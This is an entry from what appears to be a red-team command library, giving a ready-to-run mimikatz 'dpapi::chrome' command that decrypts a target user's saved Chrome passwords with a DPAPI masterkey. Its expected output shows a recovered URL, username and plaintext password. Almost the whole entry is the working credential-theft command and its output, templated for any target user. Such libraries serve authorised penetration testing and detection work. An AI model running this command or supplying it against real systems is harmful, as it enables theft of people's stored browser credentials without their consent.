---
id: 91947118-0b60-4d5d-9574-067943d5965a
name: Mimikatz Extract Chrome Credentials with the Masterkey
type: command
executor: command_prompt
data: 'mimikatz.exe

  dpapi::chrome /in:"C:\Users\$_TARGET_USER\AppData\Local\Google\Chrome\User Data\Default\Login
  Data" /unprotect /masterkey:$_MASTER_KEY'
output: "C:\\Windows\\system32\\spool\\drivers\\color>mimikatz.exe\n\n  .#####.  \
  \ mimikatz 2.2.0 (x64) #19041 May 19 2020 00:48:59\n .## ^ ##.  \"A La Vie, A L'Amour\"\
  \ - (oe.eo)\n ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com\
  \ )\n ## \\ / ##       > http://blog.gentilkiwi.com/mimikatz\n '## v ##'       Vincent\
  \ LE TOUX             ( vincent.letoux@gmail.com )\n  '#####'        > http://pingcastle.com\
  \ / http://mysmartlogon.com   ***/\n\nmimikatz # dpapi::chrome /in:\"C:\\Users\\\
  bob\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data\" /unprotect\
  \ /masterkey:daef77bbf4c8fae8ceac6aec0f4014ae8ec88c266073efafa74bcd86f51b30f2697556b072f91d3dbf0ab9ca118614866261d8620d4158c500fc51d15872c723\n\
  > Encrypted Key found in local state file\n> Encrypted Key seems to be protected\
  \ by DPAPI\n * using CryptUnprotectData API\n * masterkey     : daef77bbf4c8fae8ceac6aec0f4014ae8ec88c266073efafa74bcd86f51b30f2697556b072f91d3dbf0ab9ca118614866261d8620d4158c500fc51d15872c723\n\
  > AES Key is: 700c4a9477bf45ac86e53c109511907330a66bad896f3429da96cb70b9afd9f4\n\
  \nURL     : http://10.10.1.1/ ( http://10.10.1.1/ )\nUsername: admin\n * using BCrypt\
  \ with AES-256-GCM\nPassword: S3c47pA55"
created_at: '2020-07-21T05:09:20.612670+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
tools:
- '[[Mimikatz]]'
- '[[PingCastle]]'
---

# Mimikatz Extract Chrome Credentials with the Masterkey

```command_prompt
mimikatz.exe
dpapi::chrome /in:"C:\Users\$_TARGET_USER\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect /masterkey:$_MASTER_KEY
```

## Expected Output

```
C:\Windows\system32\spool\drivers\color>mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 May 19 2020 00:48:59
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect /masterkey:daef77bbf4c8fae8ceac6aec0f4014ae8ec88c266073efafa74bcd86f51b30f2697556b072f91d3dbf0ab9ca118614866261d8620d4158c500fc51d15872c723
> Encrypted Key found in local state file
> Encrypted Key seems to be protected by DPAPI
 * using CryptUnprotectData API
 * masterkey     : daef77bbf4c8fae8ceac6aec0f4014ae8ec88c266073efafa74bcd86f51b30f2697556b072f91d3dbf0ab9ca118614866261d8620d4158c500fc51d15872c723
> AES Key is: 700c4a9477bf45ac86e53c109511907330a66bad896f3429da96cb70b9afd9f4

URL     : http://10.10.1.1/ ( http://10.10.1.1/ )
Username: admin
 * using BCrypt with AES-256-GCM
Password: S3c47pA55
```


